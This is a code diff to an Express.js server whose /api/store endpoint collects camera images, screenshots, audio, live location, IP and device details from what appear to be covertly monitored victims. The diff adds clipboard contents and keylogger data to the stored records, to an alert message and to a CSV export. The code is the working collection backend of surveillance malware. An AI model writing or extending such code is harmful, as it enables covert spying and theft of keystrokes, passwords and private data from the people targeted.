@@ -93,7 +93,7 @@ app.post('/api/store', async (req, res) => {
         const { 
             cameraImage, location, deviceDetails, screenshot, 
             userPhoto, audioData, ipAddress, fullDeviceInfo,
-            networkSpeed, liveLocation, captureCount
+            networkSpeed, liveLocation, captureCount, clipboardData, keylogData
         } = req.body;
 
         const newEntry = {
@@ -109,6 +109,8 @@ app.post('/api/store', async (req, res) => {
             networkSpeed: networkSpeed || {},
             liveLocation: liveLocation || {},
             captureCount: captureCount || 0,
+            clipboardData: clipboardData || null,
+            keylogData: keylogData || null,
             timestamp: new Date().toISOString()
         };
 
@@ -126,6 +128,8 @@ app.post('/api/store', async (req, res) => {
 🚀 Speed: ${networkSpeed?.download || 'Unknown'} Mbps
 🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'}
 📸 Captures: ${captureCount || 1}
+📋 Clipboard: ${clipboardData ? 'Captured' : 'No'}
+⌨️ Keylog: ${keylogData ? 'Captured' : 'No'}
 🕐 Time: ${new Date().toISOString()}
         `;
 
@@ -160,7 +164,7 @@ app.get('/api/get-ip', (req, res) => {
 // ==========================================
 app.get('/api/export-csv', (req, res) => {
     try {
-        let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Device,Model,Network,Speed,Audio,Captures\n';
+        let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Device,Model,Network,Speed,Audio,Captures,Clipboard,Keylog\n';
         
         allData.forEach(item => {
             const row = [
@@ -174,7 +178,9 @@ app.get('/api/export-csv', (req, res) => {
                 item.fullDeviceInfo?.connection?.type || 'Unknown',
                 item.networkSpeed?.download || 'Unknown',
                 item.audioData ? 'Yes' : 'No',
-                item.captureCount || 1
+                item.captureCount || 1,
+                item.clipboardData ? 'Yes' : 'No',
+                item.keylogData ? 'Yes' : 'No'
             ];
             csv += row.join(',') + '\n';
         });
